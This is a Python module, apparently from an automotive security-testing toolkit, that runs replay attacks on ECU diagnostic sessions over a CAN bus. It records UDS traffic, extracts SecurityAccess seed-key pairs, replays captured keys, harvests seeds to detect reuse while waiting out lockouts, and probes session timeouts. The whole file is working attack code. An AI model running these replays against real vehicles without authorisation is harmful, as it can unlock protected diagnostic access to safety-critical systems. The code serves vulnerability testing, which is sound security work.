"""
Replay attack module for ECU diagnostic sessions.

Records UDS diagnostic sessions, isolates SecurityAccess seed-key
sequences, and replays them to test for session reuse vulnerabilities,
seed predictability, and session timeout enforcement.
"""

from __future__ import annotations

import hashlib
import json
import logging
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path
from typing import Optional

from src.protocols.can_interface import CANFrame, CANInterface
from src.protocols.uds import (
    NegativeResponseCode,
    ServiceID,
    UDSMessage,
    POSITIVE_RESPONSE_OFFSET,
    NEGATIVE_RESPONSE_SID,
)
from src.utils.timing import TimingAnalyzer

logger = logging.getLogger(__name__)


class ReplayResult(Enum):
    """Outcome classification for a replay attempt."""

    SUCCESS = auto()          # ECU accepted the replayed sequence
    REJECTED_INVALID_KEY = auto()  # ECU rejected with NRC 0x35
    REJECTED_SEQUENCE_ERROR = auto()  # ECU rejected with NRC 0x24
    REJECTED_SESSION_EXPIRED = auto()  # Session timed out
    REJECTED_OTHER = auto()    # Other negative response
    TIMEOUT = auto()           # No response from ECU
    SEED_REUSE_DETECTED = auto()  # Same seed received (vulnerability)


@dataclass
class CapturedExchange:
    """A single request-response pair from a diagnostic session."""

    request: bytes
    response: bytes
    timestamp_request: float
    timestamp_response: float
    service_id: int

    @property
    def response_time_ms(self) -> float:
        """Response time in milliseconds."""
        return (self.timestamp_response - self.timestamp_request) * 1000

    @property
    def is_security_access(self) -> bool:
        """Check if this exchange is a SecurityAccess message."""
        return self.service_id == ServiceID.SECURITY_ACCESS

    @property
    def is_positive(self) -> bool:
        """Check if the response was positive."""
        return len(self.response) > 0 and self.response[0] != NEGATIVE_RESPONSE_SID

    def to_dict(self) -> dict:
        return {
            "request": self.request.hex(),
            "response": self.response.hex(),
            "timestamp_request": self.timestamp_request,
            "timestamp_response": self.timestamp_response,
            "service_id": f"0x{self.service_id:02X}",
            "response_time_ms": round(self.response_time_ms, 2),
        }


@dataclass
class SecurityAccessSequence:
    """A captured SecurityAccess seed-key exchange."""

    seed_request: bytes
    seed_response: bytes
    seed: bytes
    key_request: bytes
    key_response: bytes
    key: bytes
    access_level: int
    timestamp: float
    successful: bool

    @property
    def seed_hash(self) -> str:
        """SHA-256 hash of the seed for comparison."""
        return hashlib.sha256(self.seed).hexdigest()[:16]

    def to_dict(self) -> dict:
        return {
            "access_level": f"0x{self.access_level:02X}",
            "seed": self.seed.hex(),
            "seed_hash": self.seed_hash,
            "key": self.key.hex(),
            "successful": self.successful,
            "timestamp": self.timestamp,
        }


@dataclass
class ReplaySession:
    """Complete replay attack session with results."""

    exchanges: list[CapturedExchange] = field(default_factory=list)
    security_sequences: list[SecurityAccessSequence] = field(default_factory=list)
    replay_results: list[dict] = field(default_factory=list)
    captured_seeds: list[bytes] = field(default_factory=list)
    start_time: float = field(default_factory=time.time)
    end_time: Optional[float] = None

    @property
    def duration(self) -> float:
        end = self.end_time or time.time()
        return end - self.start_time

    @property
    def seed_reuse_count(self) -> int:
        """Count how many seeds appear more than once."""
        seen: dict[str, int] = {}
        for seed in self.captured_seeds:
            h = hashlib.sha256(seed).hexdigest()[:16]
            seen[h] = seen.get(h, 0) + 1
        return sum(1 for count in seen.values() if count > 1)

    @property
    def unique_seed_ratio(self) -> float:
        """Ratio of unique seeds to total seeds collected."""
        if not self.captured_seeds:
            return 0.0
        unique = len(set(s.hex() for s in self.captured_seeds))
        return unique / len(self.captured_seeds)


class ReplayAttack:
    """Executes replay attacks against automotive ECUs.

    Captures diagnostic sessions, isolates SecurityAccess handshakes,
    and replays them to identify vulnerabilities such as seed reuse,
    weak key derivation, and improper session management.
    """

    def __init__(
        self,
        can_interface: CANInterface,
        tx_id: int = 0x7E0,
        rx_id: int = 0x7E8,
        response_timeout: float = 5.0,
    ) -> None:
        """Initialize replay attack module.

        Args:
            can_interface: CAN bus interface for communication.
            tx_id: Transmit arbitration ID for the target ECU.
            rx_id: Receive arbitration ID from the target ECU.
            response_timeout: Timeout for ECU responses.
        """
        self._can = can_interface
        self._tx_id = tx_id
        self._rx_id = rx_id
        self._timeout = response_timeout
        self._session = ReplaySession()
        self._timing = TimingAnalyzer()

    @property
    def session(self) -> ReplaySession:
        """Return the current replay session."""
        return self._session

    def record_session(self, duration: float) -> list[CapturedExchange]:
        """Record all UDS exchanges for a given duration.

        Passively captures CAN traffic and pairs requests with responses
        based on arbitration IDs and timing.

        Args:
            duration: Recording duration in seconds.

        Returns:
            List of captured request-response exchanges.
        """
        logger.info("Recording session for %.1f seconds (TX=0x%03X, RX=0x%03X)",
                     duration, self._tx_id, self._rx_id)

        frames: list[CANFrame] = []
        deadline = time.time() + duration

        while time.time() < deadline:
            frame = self._can.recv(timeout=min(0.5, deadline - time.time()))
            if frame is not None:
                if frame.arbitration_id in (self._tx_id, self._rx_id):
                    frames.append(frame)

        exchanges = self._pair_frames(frames)
        self._session.exchanges.extend(exchanges)
        self._extract_security_sequences(exchanges)

        logger.info("Recorded %d exchanges (%d SecurityAccess sequences)",
                     len(exchanges), len(self._session.security_sequences))
        return exchanges

    def _pair_frames(self, frames: list[CANFrame]) -> list[CapturedExchange]:
        """Pair request frames with their corresponding responses.

        Uses timing-based matching: a response is the first frame on
        the rx_id after a request on tx_id.

        Args:
            frames: Raw CAN frames from recording.

        Returns:
            Paired request-response exchanges.
        """
        exchanges: list[CapturedExchange] = []
        pending_request: Optional[CANFrame] = None

        for frame in frames:
            if frame.arbitration_id == self._tx_id:
                pending_request = frame
            elif frame.arbitration_id == self._rx_id and pending_request is not None:
                # Extract UDS data from single-frame ISO-TP
                req_uds = self._extract_isotp_data(pending_request.data)
                resp_uds = self._extract_isotp_data(frame.data)

                if req_uds and resp_uds:
                    exchange = CapturedExchange(
                        request=req_uds,
                        response=resp_uds,
                        timestamp_request=pending_request.timestamp,
                        timestamp_response=frame.timestamp,
                        service_id=req_uds[0],
                    )
                    exchanges.append(exchange)

                pending_request = None

        return exchanges

    @staticmethod
    def _extract_isotp_data(can_data: bytes) -> Optional[bytes]:
        """Extract UDS payload from single-frame ISO-TP CAN data.

        Args:
            can_data: Raw 8-byte CAN data field.

        Returns:
            UDS payload bytes or None if not a valid single frame.
        """
        if len(can_data) < 2:
            return None

        pci_type = (can_data[0] >> 4) & 0x0F
        if pci_type != 0:  # Only handle single frames (PCI type 0)
            return None

        length = can_data[0] & 0x0F
        if length == 0 or length > 7:
            return None

        return can_data[1 : 1 + length]

    def _extract_security_sequences(
        self, exchanges: list[CapturedExchange]
    ) -> None:
        """Extract SecurityAccess seed-key sequences from exchanges.

        Identifies pairs of requestSeed (odd sub-function) and
        sendKey (even sub-function) exchanges.

        Args:
            exchanges: Captured UDS exchanges.
        """
        i = 0
        while i < len(exchanges) - 1:
            ex = exchanges[i]
            if not ex.is_security_access or not ex.is_positive:
                i += 1
                continue

            # Check if this is a requestSeed (odd sub-function)
            if len(ex.request) < 2:
                i += 1
                continue

            sub_func = ex.request[1]
            if sub_func % 2 == 0:  # Even = sendKey, skip
                i += 1
                continue

            # Extract seed from positive response
            seed = ex.response[2:] if len(ex.response) > 2 else b""
            self._session.captured_seeds.append(seed)

            # Look for the matching sendKey in next exchange
            if i + 1 < len(exchanges):
                key_ex = exchanges[i + 1]
                if (
                    key_ex.is_security_access
                    and len(key_ex.request) >= 2
                    and key_ex.request[1] == sub_func + 1
                ):
                    key = key_ex.request[2:] if len(key_ex.request) > 2 else b""
                    seq = SecurityAccessSequence(
                        seed_request=ex.request,
                        seed_response=ex.response,
                        seed=seed,
                        key_request=key_ex.request,
                        key_response=key_ex.response,
                        key=key,
                        access_level=sub_func,
                        timestamp=ex.timestamp_request,
                        successful=key_ex.is_positive,
                    )
                    self._session.security_sequences.append(seq)
                    i += 2
                    continue

            i += 1

    def replay_sequence(
        self, exchanges: list[CapturedExchange], preserve_timing: bool = True
    ) -> list[dict]:
        """Replay a captured sequence of UDS exchanges.

        Sends each request from the capture and compares the ECU
        response to the original.

        Args:
            exchanges: List of exchanges to replay.
            preserve_timing: If True, maintain original inter-message timing.

        Returns:
            List of result dictionaries for each replayed exchange.
        """
        results: list[dict] = []
        logger.info("Replaying %d exchanges (preserve_timing=%s)",
                     len(exchanges), preserve_timing)

        for i, exchange in enumerate(exchanges):
            if preserve_timing and i > 0:
                delta = exchange.timestamp_request - exchanges[i - 1].timestamp_request
                if delta > 0:
                    time.sleep(delta)

            # Send the original request
            response_data = self._can.send_uds_request(
                tx_id=self._tx_id,
                rx_id=self._rx_id,
                uds_data=exchange.request,
                timeout=self._timeout,
            )

            result = {
                "index": i,
                "original_request": exchange.request.hex(),
                "original_response": exchange.response.hex(),
                "replay_response": response_data.hex() if response_data else None,
                "timestamp": time.time(),
            }

            if response_data is None:
                result["outcome"] = ReplayResult.TIMEOUT.name
            elif response_data == exchange.response:
                result["outcome"] = ReplayResult.SUCCESS.name
            elif response_data[0] == NEGATIVE_RESPONSE_SID:
                nrc = response_data[2] if len(response_data) >= 3 else 0xFF
                if nrc == NegativeResponseCode.INVALID_KEY:
                    result["outcome"] = ReplayResult.REJECTED_INVALID_KEY.name
                elif nrc == NegativeResponseCode.REQUEST_SEQUENCE_ERROR:
                    result["outcome"] = ReplayResult.REJECTED_SEQUENCE_ERROR.name
                elif nrc in (
                    NegativeResponseCode.CONDITIONS_NOT_CORRECT,
                    NegativeResponseCode.SERVICE_NOT_SUPPORTED_IN_ACTIVE_SESSION,
                ):
                    result["outcome"] = ReplayResult.REJECTED_SESSION_EXPIRED.name
                else:
                    result["outcome"] = ReplayResult.REJECTED_OTHER.name
                    result["nrc"] = f"0x{nrc:02X}"
            else:
                result["outcome"] = ReplayResult.SUCCESS.name
                result["note"] = "Different response content but positive"

            results.append(result)
            self._session.replay_results.append(result)

            logger.debug("Replay #%d: %s", i, result["outcome"])

        return results

    def replay_security_access(
        self, sequence: SecurityAccessSequence
    ) -> dict:
        """Replay a specific SecurityAccess seed-key sequence.

        Tests whether the ECU accepts the same key for a new seed,
        which would indicate a vulnerability in the key derivation.

        Args:
            sequence: Captured SecurityAccess exchange.

        Returns:
            Result dictionary with findings.
        """
        result = {
            "original_seed": sequence.seed.hex(),
            "original_key": sequence.key.hex(),
            "access_level": sequence.access_level,
            "timestamp": time.time(),
            "findings": [],
        }

        # Step 1: Request a new seed
        seed_request = bytes([ServiceID.SECURITY_ACCESS, sequence.access_level])
        seed_response = self._can.send_uds_request(
            tx_id=self._tx_id,
            rx_id=self._rx_id,
            uds_data=seed_request,
            timeout=self._timeout,
        )

        if seed_response is None:
            result["outcome"] = ReplayResult.TIMEOUT.name
            return result

        if seed_response[0] == NEGATIVE_RESPONSE_SID:
            result["outcome"] = ReplayResult.REJECTED_OTHER.name
            return result

        new_seed = seed_response[2:] if len(seed_response) > 2 else b""
        result["new_seed"] = new_seed.hex()

        # Check for seed reuse
        if new_seed == sequence.seed:
            result["findings"].append("CRITICAL: Seed reuse detected - same seed returned")
            result["outcome"] = ReplayResult.SEED_REUSE_DETECTED.name
            self._session.captured_seeds.append(new_seed)

        # Step 2: Send the original key
        key_request = bytes([ServiceID.SECURITY_ACCESS, sequence.access_level + 1])
        key_request += sequence.key

        key_response = self._can.send_uds_request(
            tx_id=self._tx_id,
            rx_id=self._rx_id,
            uds_data=key_request,
            timeout=self._timeout,
        )

        if key_response is None:
            result["outcome"] = ReplayResult.TIMEOUT.name
            return result

        if key_response[0] != NEGATIVE_RESPONSE_SID:
            result["findings"].append(
                "CRITICAL: ECU accepted replayed key for a different seed"
            )
            result["outcome"] = ReplayResult.SUCCESS.name
        else:
            nrc = key_response[2] if len(key_response) >= 3 else 0xFF
            if nrc == NegativeResponseCode.INVALID_KEY:
                if "outcome" not in result or result["outcome"] != ReplayResult.SEED_REUSE_DETECTED.name:
                    result["outcome"] = ReplayResult.REJECTED_INVALID_KEY.name
            else:
                result["outcome"] = ReplayResult.REJECTED_OTHER.name

        return result

    def detect_seed_reuse(
        self, num_samples: int = 100, delay_between: float = 0.5
    ) -> dict:
        """Collect multiple seeds to detect seed reuse.

        Requests seeds repeatedly and checks for duplicates, which
        indicates a weak PRNG in the SecurityAccess implementation.

        Args:
            num_samples: Number of seeds to collect.
            delay_between: Delay between seed requests.

        Returns:
            Analysis results with seed statistics.
        """
        logger.info("Collecting %d seeds for reuse analysis", num_samples)
        seeds: list[bytes] = []
        seed_hashes: dict[str, list[int]] = {}

        for i in range(num_samples):
            seed_request = bytes([ServiceID.SECURITY_ACCESS, 0x01])
            response = self._can.send_uds_request(
                tx_id=self._tx_id,
                rx_id=self._rx_id,
                uds_data=seed_request,
                timeout=self._timeout,
            )

            if response is None or response[0] == NEGATIVE_RESPONSE_SID:
                # Handle lockout by waiting
                if response and len(response) >= 3:
                    nrc = response[2]
                    if nrc == NegativeResponseCode.REQUIRED_TIME_DELAY_NOT_EXPIRED:
                        logger.info("Time delay active, waiting 10s")
                        time.sleep(10.0)
                        continue
                    if nrc == NegativeResponseCode.EXCEEDED_NUMBER_OF_ATTEMPTS:
                        logger.info("Locked out, waiting 10s")
                        time.sleep(10.0)
                        continue
                continue

            seed = response[2:] if len(response) > 2 else b""
            seeds.append(seed)
            self._session.captured_seeds.append(seed)

            h = seed.hex()
            if h not in seed_hashes:
                seed_hashes[h] = []
            seed_hashes[h].append(i)

            # Send an invalid key to reset the state (intentionally fail)
            invalid_key = b"\x00" * len(seed)
            key_request = bytes([ServiceID.SECURITY_ACCESS, 0x02]) + invalid_key
            self._can.send_uds_request(
                tx_id=self._tx_id,
                rx_id=self._rx_id,
                uds_data=key_request,
                timeout=self._timeout,
            )

            if delay_between > 0:
                time.sleep(delay_between)

        # Analysis
        duplicates = {h: indices for h, indices in seed_hashes.items() if len(indices) > 1}
        unique_count = len(seed_hashes)

        result = {
            "total_samples": len(seeds),
            "unique_seeds": unique_count,
            "unique_ratio": round(unique_count / len(seeds), 4) if seeds else 0,
            "duplicate_count": len(duplicates),
            "duplicates": {
                h: {"count": len(indices), "indices": indices}
                for h, indices in duplicates.items()
            },
            "seed_length_bytes": len(seeds[0]) if seeds else 0,
            "vulnerability": len(duplicates) > 0,
            "severity": self._classify_seed_reuse_severity(unique_count, len(seeds)),
        }

        if result["vulnerability"]:
            logger.warning(
                "SEED REUSE DETECTED: %d/%d seeds are duplicates",
                len(duplicates),
                len(seeds),
            )
        else:
            logger.info("No seed reuse detected in %d samples", len(seeds))

        return result

    @staticmethod
    def _classify_seed_reuse_severity(unique: int, total: int) -> str:
        """Classify the severity of seed reuse based on unique ratio."""
        if total == 0:
            return "N/A"
        ratio = unique / total
        if ratio < 0.1:
            return "CRITICAL"
        if ratio < 0.5:
            return "HIGH"
        if ratio < 0.9:
            return "MEDIUM"
        if ratio < 1.0:
            return "LOW"
        return "NONE"

    def check_session_timeout(
        self, exchanges: list[CapturedExchange], delays: list[float]
    ) -> list[dict]:
        """Test session timeout enforcement by replaying with delays.

        Inserts increasing delays between messages to find the
        session timeout threshold.

        Args:
            exchanges: Captured exchanges to replay.
            delays: List of delay values to test (seconds).

        Returns:
            Results for each delay tested.
        """
        results: list[dict] = []

        for delay in sorted(delays):
            logger.info("Testing session timeout with %.1fs delay", delay)

            # Establish session first
            session_request = bytes([0x10, 0x03])  # ExtendedDiagnostic
            resp = self._can.send_uds_request(
                self._tx_id, self._rx_id, session_request, self._timeout
            )
            if resp is None or resp[0] == NEGATIVE_RESPONSE_SID:
                results.append({"delay": delay, "outcome": "session_setup_failed"})
                continue

            # Wait for the specified delay
            time.sleep(delay)

            # Try to send a request that requires an active session
            test_request = exchanges[0].request if exchanges else bytes([0x22, 0xF1, 0x90])
            resp = self._can.send_uds_request(
                self._tx_id, self._rx_id, test_request, self._timeout
            )

            if resp is None:
                outcome = "timeout"
            elif resp[0] == NEGATIVE_RESPONSE_SID:
                nrc = resp[2] if len(resp) >= 3 else 0xFF
                if nrc in (0x7F, 0x22):
                    outcome = "session_expired"
                else:
                    outcome = f"rejected_nrc_0x{nrc:02X}"
            else:
                outcome = "session_still_active"

            results.append({
                "delay_seconds": delay,
                "outcome": outcome,
                "response": resp.hex() if resp else None,
            })
            logger.info("Delay %.1fs: %s", delay, outcome)

        return results

    def save_session(self, filepath: str) -> None:
        """Save the complete replay session to a JSON file.

        Args:
            filepath: Output file path.
        """
        self._session.end_time = time.time()

        data = {
            "metadata": {
                "tx_id": f"0x{self._tx_id:03X}",
                "rx_id": f"0x{self._rx_id:03X}",
                "start_time": self._session.start_time,
                "end_time": self._session.end_time,
                "duration_seconds": round(self._session.duration, 2),
            },
            "exchanges": [ex.to_dict() for ex in self._session.exchanges],
            "security_sequences": [
                seq.to_dict() for seq in self._session.security_sequences
            ],
            "replay_results": self._session.replay_results,
            "seed_analysis": {
                "total_seeds": len(self._session.captured_seeds),
                "unique_ratio": round(self._session.unique_seed_ratio, 4),
                "reuse_count": self._session.seed_reuse_count,
            },
        }

        path = Path(filepath)
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w") as f:
            json.dump(data, f, indent=2)

        logger.info("Session saved to %s", filepath)
